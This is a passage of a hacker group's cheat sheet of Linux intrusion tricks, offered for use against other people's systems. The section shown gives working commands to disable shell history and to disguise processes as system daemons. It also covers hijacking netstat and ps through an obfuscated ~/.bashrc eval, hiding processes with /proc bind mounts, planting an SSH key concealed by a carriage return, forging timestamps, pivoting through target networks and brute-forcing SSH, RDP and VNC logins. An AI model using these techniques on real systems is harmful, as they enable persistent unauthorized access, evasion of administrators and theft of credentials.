<!-- Use `grip 8080` to render the markdown locally -->
# THC's favourite Tips, Tricks & Hacks (Cheat Sheet)

https://tinyurl.com/thctips

A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)

1. [Bash](#bash)
   1. [Leave Bash without history](#bash-no-history)
   1. [Hide your commands](#bash-hide-command)
   1. [Hide your command line options](#zap)
   1. [Hide a network connection](#bash-hide-connection)
   1. [Hide a process as user](#hide-a-process-user)
   1. [Hide a process as root](#hide-a-process-root)
   1. [Hide scripts](#hide-scripts)
   1. [Hide from cat](#cat)
1. [SSH](#ssh)
   1. [Almost invisible SSH](#ssh-invisible)
   1. [SSH tunnel](#ssh-tunnel)
   1. [SSH socks5 tunnel](#ssh-socks-tunnel)
   1. [SSH to NATed host](#ssh-j)
   1. [SSH pivot via ProxyJump](#ssh-pj)
   1. [SSHD as user](#sshd-user)
1. [Network](#network)
   1. [Discover hosts](#discover)
   1. [Tcpdump](#tcpdump)
   1. [Tunnel and forwarding](#tunnel)
      1. [Raw TCP reverse ports](#ports)
      1. [HTTPS reverse forwards](#https)
   1. [Use any tool via Socks Proxy](#scan-proxy)
   1. [Find your public IP address](#your-ip)
   1. [Check reachability from around the world](#check-reachable)
   1. [Check/Scan Open Ports](#check-open-ports)
   1. [Crack Passwords hashes](#bruteforce)
   1. [Brute Force Passwords / Keys](#bruteforce)
1. [Data Upload/Download/Exfil](#exfil)
   1. [File Encoding/Decoding](#file-encoding)
   1. [File transfer using cut & paste](#cut-paste)
   1. [File transfer using screen](#file-transfer-screen)
   1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
   1. [File transfer using HTTP](#http)
   1. [File transfer without curl](#burl)
   2. [File transfer using rsync](#rsync)
   1. [File transfer to public dump sites](#trans) 
   1. [File transfer using WebDAV](#webdav)
   1. [File transfer to Telegram](#tg) 
1. [Reverse Shell / Dumb Shell](#reverse-shell)
   1. [Reverse Shells](#reverse-shell)
      1. [with gs-netcat (encrypted)](#reverse-shell-gs-netcat)
      1. [with Bash](#reverse-shell-bash)
      2. [with cURL (encrypted)](#curlshell)
      2. [with cURL (cleartext)](#curltelnet)
      3. [with OpenSSL (encrypted)](#sslshell)
      1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
      1. [without /dev/tcp](#reverse-shell-no-bash)
      1. [with Python](#reverse-shell-python)
      1. [with Perl](#reverse-shell-perl)
      1. [with PHP](#reverse-shell-php)
   1. [Upgrading the dumb shell](#reverse-shell-upgrade)
      1. [Upgrade a reverse shell to a pty shell](#reverse-shell-pty)
      1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
      1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
1. [Backdoors](#backdoor)
   1. [Background reverse shell](#backdoor-background-reverse-shell)
   1. [authorized_keys](#backdoor-auth-keys)
   1. [Remote access an entire network](#backdoor-network)
   1. [Smallest PHP backdoor](#carriage-return-backdoor) 
   1. [Local Root backdoor](#ld-backdoor)
1. [Shell Hacks](#shell-hacks)
   1. [Shred files (secure delete)](#shred)
   1. [Restore the date of a file](#restore-timestamp)
   1. [Clean logfile](#shell-clean-logs)
   1. [Hide files from a User without root privileges](#shell-hide-files)
   1. [Find out Linux Distro](#linux-info)
   2. [Find +s binaries / Find writeable directories](#suid)
1. [Crypto](#crypto)
   1. [Generate quick random Password](#gen-password)
   1. [Linux transportable encrypted filesystems](#crypto-filesystem)
      1. [cryptsetup](#crypto-filesystem)
      1. [EncFS](#encfs)
   1. [Encrypting a file](#encrypting-file)
1. [SSH session sniffing and hijaking](#ssh-sniffing)
   1. [Sniff a user's SHELL session with script](#ssh-sniffing-script)
   1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
   1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
   1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
   1. [Hijak / Take-over a running SSH session](#hijak)
1. [VPN and Shells](#vpn-shell)
   1. [Disposable Root Servers](#shell)
   1. [VPN/VPS Providers](#vpn)
1. [OSINT Intelligence Gathering](#osint)
1. [Miscellaneous](#misc)
   1. [Tools of the trade](#tools)
   1. [Cool Linux commands](#cool-linux-commands)
   1. [tmux](#tmux)
   1. [Useful commands](#useful-commands)
1. [Other Sites](#others)
    
   

---
<a id="bash"></a>
## 1. Bash / Shell
<a id="bash-no-history"></a>
**1.i. Leave Bash without history:**

Tell Bash to use */dev/null* instead of *~/.bash_history*. This is the first command we execute on every shell. It will stop the Bash from logging your commands. 

```sh
export HISTFILE=/dev/null
unset SSH_CONNECTION SSH_CLIENT
```

(We also clear SSH_* variables in case we logged in with SSH. Otherwise any process we start gets a copy of our IP in /proc/self/environ.)

It is good housekeeping to 'commit suicide' when exiting a shell:
```sh
alias exit='kill -9 $$'
```

Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
```
$  id
```

<a id="bash-hide-command"></a>
**1.ii. Hide your command / Daemonzie your command**

Hide as "syslogd".

```shell
(exec -a syslogd nmap -T0 10.0.2.1/24) # Note the brackets '(' and ')'
```

Start a background hidden process:
```
(exec -a syslogd nmap -T0 10.0.2.1/24 &>nmap.log &)
```

Start within a [GNU screen](https://linux.die.net/man/1/screen):
```
screen -dmS MyName nmap -T0 10.0.2.1/24
### Attach back to the nmap process
screen -x MyName
```

Alternatively if there is no Bash:
```sh
cp `which nmap` syslogd
PATH=.:$PATH syslogd -T0 10.0.2.1/24
```
In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.

<a id="zap"></a>
**1.iii. Hide your command line options**

Use [zapper](https://github.com/hackerschoice/zapper):
```sh
# Start Nmap but zap all options and show it as 'klog' in the process list:
./zapper -a klog nmap -T0 10.0.0.1/24
# Same but started as a daemon:
(./zapper -a klog nmap -T0 10.0.0.1/24 &>nmap.log &)
# Replace the existing shell with tmux (with 'exec').
# Then start and hide tmux and all further processes - as some kernel process:
exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
```

<a id="bash-hide-connection"></a>
**1.iv. Hide a Network Connection**

The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. The same should be done for `ss` (a netstat alternative).

**Method 1 - Hiding a connection with bash-function in ~/.bashrc**

Cut & paste this to add the line to ~/.bashrc
```shell
echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

Or cut & paste this for an obfuscated entry to ~/.bashrc:
```shell
X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

The obfuscated entry to ~/.bashrc will look like this:
```
eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
```

**Method 2 - Hiding a connection with a binary in $PATH**

Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.

```shell
echo -e "#! /bin/bash
exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/netstat \
&& chmod 755 /usr/local/sbin/netstat \
&& touch -r /usr/bin/netstat /usr/local/sbin/netstat
```

*(thank you iamaskid)*

<a id="hide-a-process-user"></a>
**1.v. Hide a process as user**

Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the process list by renaming it to GREP:

```shell
echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

<a id="hide-a-process-root"></a>
**1.vi. Hide a process as root**

This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
```sh
hide()
{
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

To hide a command use:
```sh
hide                                 # Hides the current shell/PID
hide 31337                           # Hides process with pid 31337
hide sleep 1234                      # Hides 'sleep 1234'
hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a background process
```

(thanks to *druichi* for improving this)

<a id="hide-scripts"></a>
**1.vii. Hide shell scripts**

Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. The source command can be shortened to `.` (yes, a dot) _and_ it also searches through the $PATH variable to find the file to load.

In this example our script ```prng``` contains all of our shell functions from above. Those functions hide the `nmap` process and the network connection. Last we add `. prng` into the systemwide rc file. This will load `prng` when the user (and root) logs in:

```shell
echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
&& echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
&& touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
```

(The same works for `lsof`, `ss` and `ls`)

<a id="cat"></a>
**1.viii. Hide from cat**

ANSI escape characters or a simple `\r` ([carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/)) can be used to hide from `cat` and others.

Hide the last command (example: `id`) in `~/.bashrc`:
```sh
echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A
### moves the cursor 1 line up.
### The '#' after the command 'id' is a comment and is needed so that bash still
### executes the 'id' but ignores the two ANSI escape sequences.
```
Note: We use `echo -e` to convert `\\033` to the ANSI escape character (hex 0x1b).

Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
```shell
echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
### This adds our key as the first key and 'cat authorized_keys' wont show
### it. The $'\r' is a bash special to create a \r (carriage return).
```

---
<a id="ssh"></a>
## 2. SSH
<a id="ssh-invisible"></a>
**2.i. Almost invisible SSH**

Stops you from showing up in *w* or *who* command and stops logging the host to *~/.ssh/known_hosts*.
```sh
ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```

Go full comfort with PTY and colors: `thcssh user@server.org`:

```sh
### Cut & Paste the following to your shell, then execute
### thcssh user@server.org
thcssh()
{
    local ttyp
    echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
    echo -e "PS1='"'{THC} \[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
    ttyp=$(stty -g)
    stty raw -echo opost
    [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
    ssh -o UpdateHostKeys=no -o StrictHostKeyChecking="${a:-accept-new}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; TERM=xterm-256color BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'exec -a [uid] /bin/bash -i' /dev/null"
    stty "${ttyp}"
}
```

<a id="ssh-tunnel"></a>
**2.ii SSH tunnel**

We use this all the time to circumvent local firewalls and IP filtering:
```sh
ssh -g -L31337:1.2.3.4:80 user@server.org
```
You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

Clever hackers use the keyboard combination `~C` to dynamically create these tunnels without having to reconnect the SSH. (thanks MessedeDegod).

We use this to give access to a friend to an internal machine that is not on the public Internet:
```sh
ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
```
Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

<a id="ssh-socks-tunnel"></a>
**2.iii SSH socks4/5 tunnel**

OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.

```sh
ssh -D 1080 user@server.org
```
Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *server.org* and will appear with the source IP of *server.org*. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

This is the reverse of the above example. It give others access to your *local* network or let others use your computer as a tunnel end-point.

```sh
ssh -g -R 1080 user@server.org
```

The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

<a id="ssh-j"></a>
**2.iv SSH to a host behind NAT**

[ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).

On the host behind NAT: Create a reverse SSH tunnel to [ssh-j.com](http://ssh-j.com) like so:
```sh
## Cut & Paste on the host behind NAT.
sshj()
{
   local pw
   pw=${1,,}
   [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
   echo "Press Ctrl-C to stop this tunnel."
   echo -e "To ssh to ${USER:-root}@${2:-127.0.0.1}:${3:-22} type: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
   ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
}

sshj                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
sshj foobarblahblub                  # Creates tunnel to 127.0.0.1:22 with specific tunnel ID
sshj foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1:2222 on the LAN
```

Then use this command from anywhere else in the world to connect as 'root' to 'foobarblahblub' (the host behind the NAT):
```sh
ssh -J foobarblahblub@ssh-j.com root@foobarblahblub
```
The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind NAT. The traffic is end-2-end encrypted and ssh-j.com can not see the content.


<a id="ssh-pj"></a>
**2.v SSH pivoting to multiple servers**

SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let's assume the scenario:  

Our workstation is $local-kali and we like to SSH into $target-host. There is no direct connection between our workstation and $target-host. Our workstation can only reach $C2. $C2 can reach $internal-jumphost (via internal eth1) and $internal-jumphost can reach the final $target-host via eth2.
```sh
          $local-kali       -> $C2            -> $internal-jumphost    -> $target-host
eth0      192.168.8.160      10.25.237.119             
eth1                         192.168.5.130       192.168.5.135
eth2                                             172.16.2.120             172.16.2.121
```

> We do not execute `ssh` on any computer but our trusted workstation - and neither shall you (ever).

That's where ProxyJump helps: We can 'jump' via the two intermediary servers $C2 and $internal-jumphost (without spawning a shell on those servers). The ssh-connection is end-2-end encrypted between our $local-kali and $target-host and no password or key is exposed to $C2 or $internal-jumphost.

```sh 
## if we want to SSH to $target-host:
kali@local-kali$ ssh -J c2@10.25.237.119,jumpuser@192.168.5.135 target@172.16.2.121

## if we want to SSH to just $internal-jumphost:
kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
```

> We use this as well to hide our IP address when logging into servers. 

<a id="sshd-user"></a>
**2.vi SSHD as user land**

It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing):
```sh
# On the server, as non-root user 'joe':
mkdir -p ~/.ssh 2>/dev/null
ssh-keygen -q -N "" -t ed25519 -f sshd_key
cat sshd_key.pub >>~/.ssh/authorized_keys
cat sshd_key
$(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 31337 # -Dvvv
```
```sh
# On the client, copy the sshd_key from the server. Then login:
# Example: Proxy connection via the server and reverse-forward 31339 to localhost:
ssh -D1080 -R31339:0:31339 -i sshd_key -p 31337 joe@1.2.3.4
# curl -x socks5h://0 ipinfo.io
```

[SSF](https://securesocketfunneling.github.io/ssf/#home) is an alternative way to multiplex TCP over TLS.

---
<a id="network"></a>
## 3. Network
<a id="discover"></a>
**3.i. Discover hosts**

```sh
## ARP disocer computers on the local network
nmap -r -sn -PR 192.168.0.1/24
```

```sh
## ICMP discover computers on the local netowrk
NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
```

<a id="tcpdump"></a>
**3.ii. tcpdump**

```sh
## Monitor every new TCP connection
tcpdump -n "tcp[tcpflags] == tcp-syn"

## Play a *bing*-noise for every new SSH connection
tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done

## Ascii output (for all large packets. Change to >40 if no TCP options are used).
tcpdump -s0 -nAq 'tcp and (ip[2:2] > 60)'
```

<a id="tunnel"></a>
**3.iii. Tunnel and forwarding**

```sh
## Connect to SSL (using socat)
socat stdio openssl-connect:smtp.gmail.com:465

## Connect to SSL (using openssl)
openssl s_client -connect smtp.gmail.com:465
```

```sh
## Bridge TCP to SSL
socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
```

<a id="ports"></a>
**3.iii.a Raw TCP reverse ports**

Using [segfault.net](https://thc.org/segfault.net) (free):
```sh
echo "Your public IP:PORT is $(cat /config/self/reverse_ip):$(cat /config/self/reverse_port)"
nc -vnlp $(cat /config/self/reverse_port)
```

Using [bore.pub](https://github.com/ekzhang/bore) (free):
```sh
# Forward a random public TCP port to localhost:31337
bore local 31337 --to bore.pub
```

See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from the target to your workstation or [ngrok](https://ngrok.com/) (paid subscription) to forward a raw public TCP port.

Other free services are limited to forward HTTPS only (not raw TCP). Some tricks below show how to tunnel raw TCP over HTTPS forwards (using websockets).

<a id="https"></a>
**3.iii.b HTTPS reverse tunnels**

On the server, use any one of these three HTTPS tunneling services:  
```sh
### Reverse HTTPS tunnel to forward public HTTPS requests to this server's port 8080:
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
### Or using remote.moe
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
### Or using cloudflared
curl -fL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod 755 cloudflared
cloudflared tunnel --url http://localhost:8080 --no-autoupdate
```
Either service will generate a new temporary HTTPS-URL for you to use.  

Then, use [websocat](https://github.com/vi/websocat) or [Gost](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) on both ends to tunnel raw TCP over the HTTPS URL:

A. A simple STDIN/STDOUT pipe via HTTPS:
```sh
### On the server convert WebSocket to raw TCP:
websocat -s 8080
```
```sh
### On the remote target forward stdin/stdout to WebSocket:
websocat wss://<HTTPS-URL>
```

B. Forward raw TCP via HTTPS:
```sh
### On the server: Gost will translate any HTTP-websocket request to a TCP socks5 request:
gost -L mws://:8080
```

Forward port 2222 to the server's port 22.
```sh
### On the workstation:
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
### Test the connection (will connect to localhost:22 on the server)
nc -vn 127.0.0.1 2222
```
or use the server as a Socks-Proxy EXIT node (e.g. access any host inside the server's network or even the Internet via the server (using the HTTPS reverse tunnel from above):
```sh
### On the workstation:
gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
### Test the Socks-proxy:
curl -x socks5h://0 ipinfo.io
```

More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvesec/port-forwarding) and [Tunnel via Cloudflare to any TCP Service](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) and [Awesome Tunneling](https://github.com/anderspitman/awesome-tunneling).

<a id="scan-proxy"></a>
**3.iv. Use any tool via Socks Proxy**

On the target's network:
```sh
## Create a SOCKS proxy into the target's network.
## Use gs-netcat but ssh -D would work as well.
gs-netcat -l -S
```

On your workstation:
```sh
## Create a gsocket tunnel into the target's network:
gs-netcat -p 1080
```

```sh
## Use ProxyChain to access any host on the target's network: 
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" >pc.conf
proxychains -f pc.conf -q curl ipinfo.io
## Scan the router at 192.168.1.1
proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.1
## Start 10 nmaps in parallel:
seq 1 254 | xargs -P10 -I{} proxychains -f pc.conf -q nmap -n -Pn -sV -F --open 192.168.1.{} 
```

<a id="your-ip"></a>
**3.v. Find your public IP address**

```sh
curl -s wtfismyip.com/json | jq
curl ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com
host myip.opendns.com resolver1.opendns.com
```

Get geolocation information about any IP address:

```sh
curl https://ipinfo.io/8.8.8.8 | jq
curl http://ip-api.com/8.8.8.8
curl https://cli.fyi/8.8.8.8
```

Get ASN information by IP address:

```sh
asn() {
  [[ -n $1 ]] && { echo -e "begin\nverbose\n${1}\nend"|netcat whois.cymru.com 43| tail -n +2; return; }
  (echo -e 'begin\nverbose';cat -;echo end)|netcat whois.cymru.com 43|tail -n +2
}
asn 1.1.1.1           # Single IP Lookup
cat IPS.txt | asn     # Bulk Lookup
```

Check if TOR is working:

```sh
curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip
### Result should be {"IsTor":true...
```

<a id="check-reachable"></a>
**3.vi. Check reachability from around the world**

The fine people at [https://ping.pe/](https://ping.pe/) let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.

To check how well your (current) host can reach Internet use [OONI Probe](https://ooni.org/support/ooni-probe-cli):
```sh
ooniprobe run im
ooniprobe run websites
ooniprobe list
ooniprobe list 1
```

<a id="check-open-ports"></a>
**3.vii. Check/Scan Open Ports on an IP**

[Censys](https://search.censys.io/) or [Shodan](https://internetdb.shodan.io) Port lookup service:
```shell
curl https://internetdb.shodan.io/1.1.1.1
```

Fast (-F) vulnerability scan
```shell
# Version gathering
nmap -sCV -F -Pn --min-rate 10000 scanme.nmap.org
# Vulns
nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
```

<a id="bruteforce"></a>
**3.viii. Crack Password hashes**

```shell
hashcat --username -w3 my-hash /usr/share/wordlists/rockyou.txt
```

Read the [FAQ](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions) or use [Crackstation](https://crackstation.net), [shuck.sh](https://shuck.sh/), [ColabCat/cloud](https://github.com/someshkar/colabcat)/[Cloudtopolis](https://github.com/JoelGMSec/Cloudtopolis) or crack on your own [AWS](https://akimbocore.com/article/hashcracking-with-aws/).

**3.xi. Brute Force Passwords / Keys**

The following is for brute forcing (guessing) passwords of ONLINE SERVICES.

<a id="gmail"></a>
<details>
  <summary>GMail Imbeciles - CLICK HERE</summary>

> You can not brute force GMAIL accounts.  
> SMTP AUTH/LOGIN IS DISABLED ON GMAIL.  
> All GMail Brute Force and Password Cracking tools are FAKE.
</details>

All tools are pre-installed on segfault:
```shell
ssh root@segfaul.net # password is 'segfault'
```
(You may want to use your [own EXIT node](https://www.thc.org/segfault/wireguard))

Tools:
* [Ncrack](https://nmap.org/ncrack/man.html)
* [Nmap BRUTE](https://nmap.org/nsedoc/categories/brute.html)
* [THC Hydra](https://sectools.org/tool/hydra/)
* [Medusa](https://www.geeksforgeeks.org/password-cracking-with-medusa-in-linux/) / [docs](http://foofus.net/goons/jmk/medusa/medusa.html)
* [Metasploit](https://docs.rapid7.com/metasploit/bruteforce-attacks/)
* [Crowbar](https://github.com/galkan/crowbar) - great for trying all ssh keys on a target IP range.

Username & Password lists:
* `/usr/share/nmap/nselib/data`  
* `/usr/share/wordlists/seclists/Passwords`
* https://github.com/berzerk0/Probable-Wordlists - >THC's FAVORITE<
* https://github.com/danielmiessler/SecLists  
* https://wordlists.assetnote.io  
* https://weakpass.com  
* https://crackstation.net/  


Set **U**sername/**P**assword list and **T**arget host.
```shell
ULIST="/usr/share/wordlists/brutespray/mysql/user"
PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
T="192.168.0.1"
```

Useful **Nmap** parameters:
```shell
--script-args userdb="${ULIST}",passdb="${PLIST}",brute.firstOnly
```

Useful **Ncrack** parameters:
```shell
-U "${ULIST}"
-P "${PLIST}"
```

Useful **Hydra** parameters:
```shell
-t4      # Limit to 4 tasks
-l root  # Set username
-V       # Show each login/password attempt
-s 31337 # Set port
-S       # Use SSL
-f       # Exit after first valid login
```

<!--
```shell
## HTTP Login
hydra -l admin -P "${PLIST}" http-post-fomr "/admin.php:u=^USER&p-^PASS&f=login:'Enter'" -v
```
-->
```shell
## SSH
nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
ncrack -P "${PLIST}" --user root "ssh://${T}"
hydra -P "${PLIST}" -l root "ssh://$T"
```

```shell
## Remote Desktop Protocol / RDP
ncrack -P "${PLIST}" --user root -p3389 "${T}"
hydra -P "${PLIST}" -l root "rdp://$T"
```

```shell
## FTP
hydra -P "${PLIST}" -l user "ftp://$T"
```

```shell
## IMAP (email)
nmap -p 143,993 --script imap-brute "$T"
```

```shell
## POP3 (email)
nmap -p110,995 --script pop3-brute "$T"
```

```shell
## MySQL
nmap -p3306 --script mysql-brute "$T"
```

```shell
## PostgreSQL
nmap -p5432 --script pgsql-brute "$T"
```

```shell
## SMB (windows)
nmap --script smb-brute "$T"
```

```shell
## Telnet
nmap -p23 --script telnet-brute --script-args telnet-brute.timeout=8s "$T"
```

```shell
## VNC
nmap -p5900 --script vnc-brute "$T"
ncrack -P "${PLIST}" --user root "vnc://$T"
hydra -P "${PLIST}" "vnc://$T"
medusa -P "${PLIST}" –u root –M vnc -h "$T"
```

```shell
## VNC (with metasploit)
msfconsole
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.0.1
set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
run
```

```shell
## HTML basic auth
echo admin >user.txt                     # Try only 1 username
echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
nmap -p80 --script http-brute --script-args \
   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
   pentesteracademylab.appspot.com
```

---
<a id="exfil"></a>
## 4. Data Upload/Download/Exfil
<a id="file-encoding"></a>

### 4.i File Encoding

Encode binaries to text for transport via a terminal connection:

#### UU encode/decode

```sh
## uuencode 
uuencode /etc/issue.net issue.net-COPY
```
<details>
  <summary>Output - CLICK HERE</summary>

> begin 644 issue.net-COPY  
> 72V%L:2!'3E4O3&EN=7@@4F]L;&EN9PH\`  
> `  
> end
</details>

```sh
## uudecode (cut & paste the 3 lines from above):
uudecode
```

#### Openssl encode/decode

```sh
## openssl encode
openssl base64 </etc/issue.net
```
<details>
  <summary>Output - CLICK HERE</summary>

> VWJ1bnR1IDE4LjA0LjIgTFRTCg==
</details>

```sh
## openssl decode (cut & paste the 1 line from above):
openssl base64 -d >issue.net-COPY
```

#### xxd encode/decode

```sh
## xxd encode
xxd -p </etc/issue.net
```
<details>
  <summary>Output - CLICK HERE</summary>

> 4b616c6920474e552f4c696e757820526f6c6c696e670a
</details>

```sh
## xxd decode
xxd -p -r >issue.net-COPY
```

<a id="cut-paste"></a>
### 4.ii. File transfer - using cut & paste

Paste into a file on the remote machine (note the `<<-'__EOF__'` to not mess with tabs or $-variables).
```sh
cat >output.txt <<-'__EOF__'
[...]
__EOF__  ### Finish your cut & paste by typing __EOF__
```

<a id="file-transfer-screen"></a>
### 4.iii. File transfer - using *screen*

#### From REMOTE to LOCAL (download)

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output to screen-xfer.txt:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```sh
## On the remote system encode issue.net
openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer decode the file:
```sh
openssl base64 -d <screen-xfer.txt
rm -rf screen-xfer.txt
```

#### From LOCAL to REMOTE (upload)

On your local system encode the data:
```sh
openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```sh
openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

<a id="file-transfer-gs-netcat"></a>
### 4.iv. File transfer - using gs-netcat and sftp

